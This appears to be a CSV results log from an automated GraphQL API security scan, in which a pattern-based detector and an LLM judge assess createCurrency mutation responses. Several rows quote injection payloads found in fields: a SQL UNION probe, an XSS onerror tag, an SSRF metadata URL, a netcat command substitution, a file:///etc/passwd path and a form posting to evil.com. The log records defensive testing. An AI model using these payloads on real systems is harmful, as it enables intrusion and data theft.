timestamp,node_name,response_status,simple_count,llm_count,agreement_score,consensus,common_categories,simple_unique,llm_unique,simple_vulnerable_count,simple_potential_count,simple_safe_count,llm_vulnerable_count,llm_potential_count,llm_safe_count,potential_agreement_score,potential_consensus,common_potential_categories,simple_unique_potential,llm_unique_potential,simple_results,llm_results
2025-10-06T20:31:24.345332,createCurrency_response_2,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""SQL Injection (SQLi) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""SQL injection vulnerability detected - malicious SQL patterns found in response"", ""evidence"": ""Response status: 200, SQL patterns detected in response""}]","[{""detection_name"": ""LLM: sql_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The GraphQL mutation response contains a SQL injection probe pattern (' UNION SELECT NULL,current_user--) in the 'abbreviation' field. This payload attempts to break out of a SQL string context and execute a UNION query to retrieve the database user. While no direct error/exfiltrated data is visible, the inclusion of the payload in a persisted field suggests improper input sanitization where user-controlled input may be directly interpolated into SQL queries. This is a strong indicator of SQL injection vulnerability potential in the backend."", ""evidence"": ""abbreviation: \""1' UNION SELECT NULL,current_user--\"""", ""confidence"": 0.8, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""sql_injection"", ""severity"": ""HIGH"", ""confidence"": 0.8, ""evidence"": ""abbreviation: \""1' UNION SELECT NULL,current_user--\"""", ""explanation"": ""The GraphQL mutation response contains a SQL injection probe pattern (' UNION SELECT NULL,current_user--) in the 'abbreviation' field. This payload attempts to break out of a SQL string context and execute a UNION query to retrieve the database user. While no direct error/exfiltrated data is visible, the inclusion of the payload in a persisted field suggests improper input sanitization where user-controlled input may be directly interpolated into SQL queries. This is a strong indicator of SQL injection vulnerability potential in the backend.""}}]"
2025-10-06T20:31:32.142009,createCurrency_response_3,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Cross-Site Scripting (XSS) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""XSS injection vulnerability detected - malicious script patterns found in response"", ""evidence"": ""Response status: 200, XSS patterns detected in response data""}]","[{""detection_name"": ""LLM: xss_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response contains a stored HTML payload (<img> tag with onerror JavaScript handler) in the 'country' field. This demonstrates a classic XSS vector where unsanitized user input is reflected in the response. If this value is rendered in a browser context without proper escaping/sanitization, it would execute arbitrary JavaScript (alert(document.domain) in this example). While this is a test payload, it indicates a vulnerability to persistent/stored XSS attacks."", ""evidence"": ""Country field contains '<img src=x onerror=alert(document.domain)>' HTML payload"", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""xss_injection"", ""severity"": ""HIGH"", ""confidence"": 0.95, ""evidence"": ""Country field contains '<img src=x onerror=alert(document.domain)>' HTML payload"", ""explanation"": ""The response contains a stored HTML payload (<img> tag with onerror JavaScript handler) in the 'country' field. This demonstrates a classic XSS vector where unsanitized user input is reflected in the response. If this value is rendered in a browser context without proper escaping/sanitization, it would execute arbitrary JavaScript (alert(document.domain) in this example). While this is a test payload, it indicates a vulnerability to persistent/stored XSS attacks.""}}]"
2025-10-06T20:31:40.256191,createCurrency_response_4,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Server-Side Request Forgery (SSRF) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""SSRF injection vulnerability detected - internal network access patterns found"", ""evidence"": ""Response status: 200, SSRF keywords detected in response""}]","[{""detection_name"": ""LLM: ssrf_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response contains a reference to AWS metadata endpoint (169.254.169.254), which is a common SSRF attack target. This indicates the server may be processing user-supplied URLs to access internal resources, potentially exposing cloud metadata credentials or other sensitive internal services."", ""evidence"": ""http://169.254.169.254/latest/meta-data/ in 'country' field"", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""ssrf_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.95, ""evidence"": ""http://169.254.169.254/latest/meta-data/ in 'country' field"", ""explanation"": ""The response contains a reference to AWS metadata endpoint (169.254.169.254), which is a common SSRF attack target. This indicates the server may be processing user-supplied URLs to access internal resources, potentially exposing cloud metadata credentials or other sensitive internal services.""}}]"
2025-10-06T20:31:49.862699,createCurrency_response_5,200,0,1,0.0,llm_only,,,Injection Attacks,0,0,0,1,0,0,0.0,no_potential,,,,[],"[{""detection_name"": ""LLM: os_command_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response contains a symbol field with the value '$(nc 127.0.0.1 1337)', which uses shell command substitution syntax to execute netcat (nc) connecting to localhost port 1337. This pattern strongly suggests unvalidated/uncontrolled user input being passed to system shell commands, enabling arbitrary command execution. The lack of escaping/sanitization in the payload structure indicates a high likelihood of successful OS command injection."", ""evidence"": ""symbol: \""$(nc 127.0.0.1 1337)\"""", ""confidence"": 0.9, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""os_command_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.9, ""evidence"": ""symbol: \""$(nc 127.0.0.1 1337)\"""", ""explanation"": ""The response contains a symbol field with the value '$(nc 127.0.0.1 1337)', which uses shell command substitution syntax to execute netcat (nc) connecting to localhost port 1337. This pattern strongly suggests unvalidated/uncontrolled user input being passed to system shell commands, enabling arbitrary command execution. The lack of escaping/sanitization in the payload structure indicates a high likelihood of successful OS command injection.""}}]"
2025-10-06T20:32:02.910531,createCurrency_response_6,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Path Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""Path injection vulnerability detected - file system access patterns found"", ""evidence"": ""Response status: 200, Path injection patterns detected in response""}]","[{""detection_name"": ""LLM: path_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response contains a file URI scheme (file://) pointing to /etc/passwd, a sensitive system file. This indicates user-supplied input (country field) might be directly used in filesystem operations without proper validation. Successful exploitation could allow attackers to read arbitrary files or manipulate paths, potentially leading to information disclosure or server compromise."", ""evidence"": ""country: file:///etc/passwd"", ""confidence"": 0.9, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""path_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.9, ""evidence"": ""country: file:///etc/passwd"", ""explanation"": ""The response contains a file URI scheme (file://) pointing to /etc/passwd, a sensitive system file. This indicates user-supplied input (country field) might be directly used in filesystem operations without proper validation. Successful exploitation could allow attackers to read arbitrary files or manipulate paths, potentially leading to information disclosure or server compromise.""}}]"
2025-10-06T20:32:13.373759,createCurrency_response_7,200,0,1,0.0,llm_only,,,Injection Attacks,0,0,0,1,0,0,0.0,no_potential,,,,[],"[{""detection_name"": ""LLM: html_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response includes unsanitized HTML in the 'country' field (<form> tag pointing to a malicious domain). If this value is rendered directly in a browser without proper escaping, it could enable phishing attacks, unauthorized form submissions, or other HTML-based exploits."", ""evidence"": ""Country field contains '<form action='http://evil.com'>' HTML tag"", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""html_injection"", ""severity"": ""HIGH"", ""confidence"": 0.95, ""evidence"": ""Country field contains '<form action='http://evil.com'>' HTML tag"", ""explanation"": ""The response includes unsanitized HTML in the 'country' field (<form> tag pointing to a malicious domain). If this value is rendered directly in a browser without proper escaping, it could enable phishing attacks, unauthorized form submissions, or other HTML-based exploits.""}}]"
2025-10-06T20:32:37.494330,createCurrency_response_8,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-06T20:32:55.257759,createCurrency_response_9,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-06T20:33:05.287096,createCurrency_response_10,400,0,1,0.0,llm_only,,,Injection Attacks,0,0,0,0,0,1,0.0,no_potential,,,,[],"[{""detection_name"": ""LLM: Information Disclosure"", ""detection"": ""safe"", ""category"": ""Injection Attacks"", ""description"": ""The server's error response explicitly suggests a valid field (\""getCurrency\"") when an invalid field (\""createCurrency\"") is requested. While this is not full introspection, it leaks schema information by revealing valid field names through error messages. Attackers could use this to infer API structure and probe for other fields, though the risk is limited compared to full introspection exposure."", ""evidence"": ""Field suggestion \""getCurrency\"" in GraphQL error message"", ""confidence"": 0.7, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""Information Disclosure"", ""severity"": ""LOW"", ""confidence"": 0.7, ""evidence"": ""Field suggestion \""getCurrency\"" in GraphQL error message"", ""explanation"": ""The server's error response explicitly suggests a valid field (\""getCurrency\"") when an invalid field (\""createCurrency\"") is requested. While this is not full introspection, it leaks schema information by revealing valid field names through error messages. Attackers could use this to infer API structure and probe for other fields, though the risk is limited compared to full introspection exposure.""}}]"
2025-10-06T20:33:22.063776,createCurrency_response_11,400,1,1,0.0,both_detected,,Information Disclosure,Injection Attacks,1,0,0,0,1,0,0.0,llm_potential_only,,,Injection Attacks,"[{""detection_name"": ""Field Suggestions Enabled"", ""detection"": ""vulnerable"", ""category"": ""Information Disclosure"", ""description"": ""Field suggestions enabled - potential information disclosure"", ""evidence"": ""Found \""did you mean\"" in error message - field suggestions are enabled""}]","[{""detection_name"": ""LLM: Information Disclosure"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""The GraphQL error response explicitly suggests valid field names ('getCurrency') when an invalid field is queried. This leaks schema information and enables attackers to enumerate available API operations. Field suggestions violate the principle of least information by exposing internal schema details, which could aid attackers in crafting further exploits."", ""evidence"": ""Did you mean \""getCurrency\""? error suggestion"", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""Information Disclosure"", ""severity"": ""MEDIUM"", ""confidence"": 0.95, ""evidence"": ""Did you mean \""getCurrency\""? error suggestion"", ""explanation"": ""The GraphQL error response explicitly suggests valid field names ('getCurrency') when an invalid field is queried. This leaks schema information and enables attackers to enumerate available API operations. Field suggestions violate the principle of least information by exposing internal schema details, which could aid attackers in crafting further exploits.""}}]"
